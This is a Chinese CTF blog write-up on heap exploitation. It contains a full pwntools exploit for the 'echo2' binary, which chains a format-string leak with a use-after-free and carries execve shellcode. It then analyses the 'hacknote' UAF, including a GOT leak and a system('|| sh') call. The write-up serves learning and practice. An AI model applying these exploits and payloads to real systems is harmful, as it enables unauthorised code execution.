class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">echo2 完整漏洞利用脚本</span></span><br><span class="line"><span class="string">利用链: FSB泄露栈地址 + UAF覆盖函数指针 -&gt; 执行shellcode获取shell</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">漏洞分析:</span></span><br><span class="line"><span class="string">- echo2: printf(format) 格式化字符串漏洞 -&gt; 泄露栈地址</span></span><br><span class="line"><span class="string">- echo3: free(s)后s未清空 -&gt; UAF, malloc可能返回freed的o的chunk</span></span><br><span class="line"><span class="string">- cleanup: 选择4后free(o)但输入n继续循环 -&gt; o成为dangling pointer</span></span><br><span class="line"><span class="string">- o结构: [o,o+1,0+2 24B][greetings 8B][byebye 8B]</span></span><br><span class="line"><span class="string">- 覆盖greetings后, 下次调用echo2会先执行greetings-&gt;shellcode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">BINARY = <span class="string">&#x27;./echo2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_conn</span>():</span><br><span class="line">    <span class="keyword">return</span> process(BINARY, cwd=os.path.dirname(os.path.abspath(BINARY)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = get_conn()</span><br><span class="line">    elf = ELF(BINARY, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># execve(&quot;/bin/sh&quot;) shellcode - 无null字节, scanf可读入</span></span><br><span class="line">    shellcode = <span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤1: 输入shellcode作为用户名 (存在main栈v6, 复制到堆o)</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;hey, what&#x27;s your name? : &quot;</span>)</span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤2: 选择FSB模式</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤3: 消耗 printf(&quot;hello %s\n&quot;, a1);</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;hello &quot;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤4: FSB泄露栈地址, %10$p泄露栈上指针, -0x20得到name缓冲区基址</span></span><br><span class="line">    payload = <span class="string">b&quot;%10$p&quot;</span> + <span class="string">b&quot;AAA&quot;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    leaked = p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    shellcode_addr = <span class="built_in">int</span>(leaked, <span class="number">16</span>) - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Leaked: 0x<span class="subst">&#123;leaked.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;Shellcode addr: <span class="subst">&#123;<span class="built_in">hex</span>(shellcode_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤5: 选择4触发cleanup free(o), 输入n继续循环 (o已free, UAF)</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;to exit? (y/n)&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤6: 选择UAF echo, malloc可能返回o的chunk (同size或堆布局)</span></span><br><span class="line">    <span class="comment"># 写入 &quot;A&quot;*24 + p64(shellcode) 覆盖 o+0x18(greetings)</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;hello &quot;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    payload = flat(<span class="string">b&quot;A&quot;</span> * <span class="number">24</span>, shellcode_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤7: 再次选择echo2触发greetings (已覆盖为shellcode)</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)  <span class="comment"># 或2、3均可, 都会先调用greetings</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>执行脚本，获取shell。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307215344511.png" alt="image-20260307215344511" loading="lazy" decoding="async"></p>
+<h2 id="hacknote" tabindex="-1"><a class="headerlink" href="#hacknote" aria-hidden="true"></a> hacknote</h2>
+<p>运行hacknote文件</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260308003756746.png" alt="image-20260308003756746" loading="lazy" decoding="async"></p>
+<p>检查文件的安全配置。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260308003551746.png" alt="image-20260308003551746" loading="lazy" decoding="async"></p>
+<p>发现启用了canary且栈是不可执行的<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>。</p>
+<h3 id="反编译-1" tabindex="-1"><a class="headerlink" href="#反编译-1" aria-hidden="true"></a> 反编译</h3>
+<p>这是一个去除了符号表的可执行文件。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260308005947536.png" alt="image-20260308005947536" loading="lazy" decoding="async"></p>
+<p>根据可执行文件的内容和功能，对反编译后的结果进行编辑，便于理解：</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260316221849804.png" alt="image-20260316221849804" loading="lazy" decoding="async"></p>
+<p>main函数如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = <span class="built_in">atoi</span>(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">print</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="built_in">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>add函数如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *current_control_chunk; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14u</span>);                    <span class="comment">// 打开canary</span></span><br><span class="line">  <span class="keyword">if</span> ( note_count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !note_ptr_array[i] )                 <span class="comment">// 记录note的地址的数组</span></span><br><span class="line">      &#123;</span><br><span class="line">        note_ptr_array[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);         <span class="comment">// note申请了一个8字节大小的空间，注意当前的可执行文件是32位</span></span><br><span class="line">        <span class="keyword">if</span> ( !note_ptr_array[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *note_ptr_array[i] = sub_804862B;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = <span class="built_in">atoi</span>(buf);</span><br><span class="line">        current_control_chunk = note_ptr_array[i];</span><br><span class="line">        current_control_chunk[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);<span class="comment">// 后4字节又申请了size大小的空间</span></span><br><span class="line">        <span class="keyword">if</span> ( !*(note_ptr_array[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, *(note_ptr_array[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++note_count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>delete函数如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  index = <span class="built_in">atoi</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt;= note_content )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( note_ptr_array[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(note_ptr_array[index] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(note_ptr_array[index]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>print函数如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= note_content )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( note_ptr_array[v1] )</span><br><span class="line">    (*note_ptr_array[v1])(note_ptr_array[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="add函数逻辑" tabindex="-1"><a class="headerlink" href="#add函数逻辑" aria-hidden="true"></a> add函数逻辑</h3>
+<p>下面主要看一下add函数的逻辑。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260316222242507.png" alt="image-20260316222242507" loading="lazy" decoding="async"></p>
+<p>创建了一个note笔记的数组，这个数组的数量不超过5个。对于创建的数组元素，先是申请了8字节的空间，也就是2个word的空间，这个可执行文件是32位的。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260316222728307.png" alt="image-20260316222728307" loading="lazy" decoding="async"></p>
+<p>再继续看，这8个字节是怎么用的。</p>
+<p>对于代码<code>*note_ptr_array[i] = put</code>，<code>note_ptr_array[i]</code>本身是一个指针，这个指针指向一个地址。现在进行<strong>解引用</strong>，将该指针指向的地址位置的值，修改为<code>put</code>函数的地址。因为是32位的，所以<code>note_ptr_array[i]</code>指针所指向的地址的值也是32位，占据了4字节。</p>
+<p>继续向下看，使用read函数读取了一个size，然后使用</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">current_control_chunk = note_ptr_array[i];</span><br><span class="line">current_control_chunk[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br></pre></td></tr></table></figure>
+<p>这里相当于给<code>note_ptr_array[i]</code>的后4字节，分配了一个size大小的chunk。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260316223132581.png" alt="image-20260316223132581" loading="lazy" decoding="async"></p>
+<p>分析到这里，清楚的了解到了add函数的逻辑。</p>
+<h3 id="delete函数逻辑" tabindex="-1"><a class="headerlink" href="#delete函数逻辑" aria-hidden="true"></a> delete函数逻辑</h3>
+<p>下面继续看delete函数的逻辑。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260316225444969.png" alt="image-20260316225444969" loading="lazy" decoding="async"></p>
+<p>先free掉size大小的内容，然后再free掉8字节的内容。这里发现只是free了内存，但是没有清空内存，这里是存在<code>UAF</code>漏洞的。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260316225518574.png" alt="image-20260316225518574" loading="lazy" decoding="async"></p>
+<h3 id="漏洞利用" tabindex="-1"><a class="headerlink" href="#漏洞利用" aria-hidden="true"></a> 漏洞利用</h3>
+<p>下面去思考🤔，如何进行漏洞的利用？</p>
+<p>整个程序的基本逻辑如下：</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317161635324.png" alt="image-20260317161635324" loading="lazy" decoding="async"></p>
+<p>主要的问题点前面已经看到了，在delete函数中。假设我们add了2个note，然后每个note的size大小为16字节，然后再去把note执行delete函数，delete掉note的0和1，这里看程序的逻辑会变成什么样子。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317162002369.png" alt="image-20260317162002369" loading="lazy" decoding="async"></p>
+<p>因为我使用的libc版本为2.35，所以这里free的chunk会放到<code>tcache</code>中。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317162115345.png" alt="image-20260317162115345" loading="lazy" decoding="async"></p>
+<p>再来思考🤔，当free掉了malloc的8字节和16字节，会如何放到Bin中进行管理？</p>
+<p>在32位系统中，chunk的大小计算是这样的：</p>
+<ul>
+<li>malloc(8) -&gt; 实际chunk大小 = 8 (请求) + 8 (头部) + 8 (对齐) = 24字节</li>
+<li>malloc(16) -&gt; 实际chunk大小 = 16 (请求) + 8 (头部) + 8 (对齐) = 32字节</li>
+</ul>
+<p>这样的话，就变成了如下图这样：</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317163432482.png" alt="image-20260317163432482" loading="lazy" decoding="async"></p>
+<p>我还使用了gdb进行了调试，调试的tcache如下：</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260316221651127.png" alt="image-20260316221651127" loading="lazy" decoding="async"></p>
+<p>符合分析的预期。</p>
+<p>delete掉note的0和1之后，此时再去add一个note，add一个size为8字节的note，就变成了下面的样子。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317163830598.png" alt="image-20260317163830598" loading="lazy" decoding="async"></p>
+<p>add函数是malloc了两个8字节的chunk，这就会去tcache中找chunk，刚好前面delete函数free的chunk满足条件。</p>
+<p>注意观察这里的代码逻辑，这现在有了写入的条件了，还差调用写入内容的地方。此时，我们想到了前面的print函数，print函数输出note 0，这里就可以调用我们写入的内容了。</p>
+<p>到这里，写入和调用写入都有了，想想怎么串起来去获取shell？🤔</p>
+<p>获取shell，需要system函数，现在我们不知道system函数的真实地址是什么，而且可执行文件是启用了ASLR的，无法直接获取到system函数的真实地址。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317164937194.png" alt="image-20260317164937194" loading="lazy" decoding="async"></p>
+<p>那么这里就使用之前学到的<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>，利用got表获取函数的真实地址，然后计算基地址，进而得到system函数的真实地址。</p>
+<p>那么这里就通过<code>puts</code>函数去获取真实的函数地址，因为可执行文件没有启用<code>PIE</code>，直接IDA，获取<code>puts</code>的地址。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317172610498.png" alt="image-20260317172610498" loading="lazy" decoding="async"></p>
+<p>然后将<code>got[&quot;read&quot;]</code>，作为puts函数的参数值，即可获取到read函数的真实地址。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317170508102.png" alt="image-20260317170508102" loading="lazy" decoding="async"></p>
+<p>获取read函数的真实地址，就可以获取到了system函数的真实地址。拿到了system函数的真实地址了，怎么去用呢？🤔</p>
+<p>一样的再delete掉note 2，这时候的tcache bin中两个8字节的chunk又空了下来，继续add一个size为8的chunk，写入system函数，然后调用print函数，输出note 0就可以了，执行system函数就行了。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317171246722.png" alt="image-20260317171246722" loading="lazy" decoding="async"></p>
+<p>这里有一个细节点要注意，为什么system函数传入的内容为<code>|| sh </code>？</p>
+<p>我们回头仔细看看print函数的内容。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317171530394.png" alt="image-20260317171530394" loading="lazy" decoding="async"></p>
+<p>对于代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*note_ptr_array[v1])(note_ptr_array[v1]);</span><br></pre></td></tr></table></figure>
+<p>对于IDA反编译的结果：<code>()()</code>，相当于（函数地址）（函数的参数），这就相当于函数的调用。</p>
+<p>这就很清楚了，<code>*note_ptr_array[v1]</code>为<code>system</code>函数的地址，<code>note_ptr_array[v1]</code>为参数值，这里的<code>note_ptr_array[v1]</code>包含了函数的真实地址+参数值。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317171950813.png" alt="image-20260317171950813" loading="lazy" decoding="async"></p>
